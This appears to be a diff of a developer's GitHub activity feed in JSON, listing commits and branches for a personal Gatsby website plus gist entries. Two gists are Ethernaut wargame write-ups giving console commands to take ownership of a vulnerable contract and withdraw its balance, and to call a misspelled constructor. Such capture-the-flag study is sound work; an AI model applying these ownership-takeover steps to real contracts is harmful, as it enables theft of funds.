@@ -1,10 +1,82 @@
 [
   {
-    "key": 2,
-    "html_link": "https://gist.github.com/trmchale1/95b69f2fae637f6511b9818aa007d5b0",
-    "timestamp": "2024-02-20T01:27:08Z",
-    "description": "Smart Contract Audit Ethernaut: Fallback",
-    "content": "Smart Contract Audit Ethernaut: Fallback\n\nIn this game the player must become the owner, then withdraw the full amount from the contract.\n\nThe key part is the receive() function, if the contract recieves a value greater than 0 and contributions of the sender are also greater than zero, then the sender becomes the owner.\n\nWe send some small sum to the player:\n\n``` await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')}) ```\n\nWe send a small sum to the contract:\n\n``` await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')}) ```\n\nCheck we own the contract:\n\n``` await contract.owner() ```\n\nThen withdraw the loot:\n\n``` await contract.withdraw() ```"
+    "key": 3,
+    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/b35c02971c8b0d04ce70501be6556fc0c87cfaf0",
+    "branch": "frontend-styling-2",
+    "timestamp": "2024-03-12T17:40:59Z",
+    "activity_type": "branch_creation",
+    "repo": "tim-s-gatsby-app"
+  },
+  {
+    "key": 0,
+    "html_link": "https://gist.github.com/trmchale1/e4c10dd319b83e2c043c7e729402de1a",
+    "timestamp": "2024-03-04T01:17:44Z",
+    "description": "timmchale.co is now live",
+    "content": "This is a link to the first release of timmchale.co \n\nhttps://github.com/trmchale1/tim-s-gatsby-app/releases/tag/v1.0.0\n\nThis is a link to my website \n\ntimchale.co"
+  },
+  {
+    "key": 4,
+    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/f19695cabe910ce49b2bb5bed41080c42e17bd51",
+    "branch": "master",
+    "timestamp": "2024-03-03T23:04:59Z",
+    "activity_type": "pr_merge",
+    "repo": "tim-s-gatsby-app"
+  },
+  {
+    "key": 5,
+    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/50d7f78d160385e462a1d0b7b7a1758833f20913",
+    "branch": "revert-8-revert-7-add-repo-commit-history",
+    "timestamp": "2024-03-03T23:04:50Z",
+    "activity_type": "branch_creation",
+    "repo": "tim-s-gatsby-app"
+  },
+  {
+    "key": 6,
+    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/a354fef73309ddab4e6e32cbe1154e2a1a460576",
+    "branch": "master",
+    "timestamp": "2024-03-03T22:58:30Z",
+    "activity_type": "pr_merge",
+    "repo": "tim-s-gatsby-app"
+  },
+  {
+    "key": 7,
+    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/cfc791ed1ae7f6607164ea1ad7f43e06f47739d6",
+    "branch": "revert-7-add-repo-commit-history",
+    "timestamp": "2024-03-03T22:58:18Z",
+    "activity_type": "branch_creation",
+    "repo": "tim-s-gatsby-app"
+  },
+  {
+    "key": 8,
+    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/fea1bd816d63acdfbea523ec9b278b0e4a037034",
+    "branch": "master",
+    "timestamp": "2024-03-03T22:57:17Z",
+    "activity_type": "pr_merge",
+    "repo": "tim-s-gatsby-app"
+  },
+  {
+    "key": 9,
+    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/cea675b78306d9ebb7ec67c3252fc6e381d9f763",
+    "branch": "master",
+    "timestamp": "2024-03-01T18:52:49Z",
+    "activity_type": "pr_merge",
+    "repo": "tim-s-gatsby-app"
+  },
+  {
+    "key": 10,
+    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/61f4e213b385671129ce838ffd758b282e15024b",
+    "branch": "frontend-styling-1",
+    "timestamp": "2024-03-01T15:42:05Z",
+    "activity_type": "branch_creation",
+    "repo": "tim-s-gatsby-app"
+  },
+  {
+    "key": 11,
+    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/76581bb4e899596ad07483a19c4aa88aba4008ee",
+    "branch": "add-repo-commit-history",
+    "timestamp": "2024-02-27T23:36:05Z",
+    "activity_type": "branch_creation",
+    "repo": "tim-s-gatsby-app"
   },
   {
     "key": 1,
@@ -14,90 +86,10 @@
     "content": "The constructor has incorrect syntax and is misspelled, you can call it as a function and change the ownership of the contract:\n\n``` contract.Fal1out() ```"
   },
   {
-    "key": 12,
-    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/80a2abe9f609e38e8027945fbf6a515ec6fe3db4",
-    "branch": "master",
-    "timestamp": "2024-02-27T17:52:49Z",
-    "activity_type": "pr_merge",
-    "repo": "tim-s-gatsby-app"
-  },
-  {
-    "key": 11,
-    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/991255bbcd0230bdb8af593ec393d8db4711099f",
-    "branch": "master",
-    "timestamp": "2024-02-27T18:03:44Z",
-    "activity_type": "pr_merge",
-    "repo": "tim-s-gatsby-app"
-  },
-  {
-    "key": 10,
-    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/76581bb4e899596ad07483a19c4aa88aba4008ee",
-    "branch": "add-repo-commit-history",
-    "timestamp": "2024-02-27T23:36:05Z",
-    "activity_type": "branch_creation",
-    "repo": "tim-s-gatsby-app"
-  },
-  {
-    "key": 9,
-    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/61f4e213b385671129ce838ffd758b282e15024b",
-    "branch": "frontend-styling-1",
-    "timestamp": "2024-03-01T15:42:05Z",
-    "activity_type": "branch_creation",
-    "repo": "tim-s-gatsby-app"
-  },
-  {
-    "key": 8,
-    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/cea675b78306d9ebb7ec67c3252fc6e381d9f763",
-    "branch": "master",
-    "timestamp": "2024-03-01T18:52:49Z",
-    "activity_type": "pr_merge",
-    "repo": "tim-s-gatsby-app"
-  },
-  {
-    "key": 7,
-    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/fea1bd816d63acdfbea523ec9b278b0e4a037034",
-    "branch": "master",
-    "timestamp": "2024-03-03T22:57:17Z",
-    "activity_type": "pr_merge",
-    "repo": "tim-s-gatsby-app"
-  },
-  {
-    "key": 6,
-    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/cfc791ed1ae7f6607164ea1ad7f43e06f47739d6",
-    "branch": "revert-7-add-repo-commit-history",
-    "timestamp": "2024-03-03T22:58:18Z",
-    "activity_type": "branch_creation",
-    "repo": "tim-s-gatsby-app"
-  },
-  {
-    "key": 5,
-    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/a354fef73309ddab4e6e32cbe1154e2a1a460576",
-    "branch": "master",
-    "timestamp": "2024-03-03T22:58:30Z",
-    "activity_type": "pr_merge",
-    "repo": "tim-s-gatsby-app"
-  },
-  {
-    "key": 4,
-    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/50d7f78d160385e462a1d0b7b7a1758833f20913",
-    "branch": "revert-8-revert-7-add-repo-commit-history",
-    "timestamp": "2024-03-03T23:04:50Z",
-    "activity_type": "branch_creation",
-    "repo": "tim-s-gatsby-app"
-  },
-  {
-    "key": 3,
-    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/f19695cabe910ce49b2bb5bed41080c42e17bd51",
-    "branch": "master",
-    "timestamp": "2024-03-03T23:04:59Z",
-    "activity_type": "pr_merge",
-    "repo": "tim-s-gatsby-app"
-  },
-  {
-    "key": 0,
-    "html_link": "https://gist.github.com/trmchale1/e4c10dd319b83e2c043c7e729402de1a",
-    "timestamp": "2024-03-04T01:17:44Z",
-    "description": "timmchale.co is now live",
-    "content": "This is a link to the first release of timmchale.co \n\nhttps://github.com/trmchale1/tim-s-gatsby-app/releases/tag/v1.0.0\n\nThis is a link to my website \n\ntimchale.co"
+    "key": 2,
+    "html_link": "https://gist.github.com/trmchale1/95b69f2fae637f6511b9818aa007d5b0",
+    "timestamp": "2024-02-20T01:27:08Z",
+    "description": "Smart Contract Audit Ethernaut: Fallback",
+    "content": "Smart Contract Audit Ethernaut: Fallback\n\nIn this game the player must become the owner, then withdraw the full amount from the contract.\n\nThe key part is the receive() function, if the contract recieves a value greater than 0 and contributions of the sender are also greater than zero, then the sender becomes the owner.\n\nWe send some small sum to the player:\n\n``` await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')}) ```\n\nWe send a small sum to the contract:\n\n``` await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')}) ```\n\nCheck we own the contract:\n\n``` await contract.owner() ```\n\nThen withdraw the loot:\n\n``` await contract.withdraw() ```"
   }
 ]
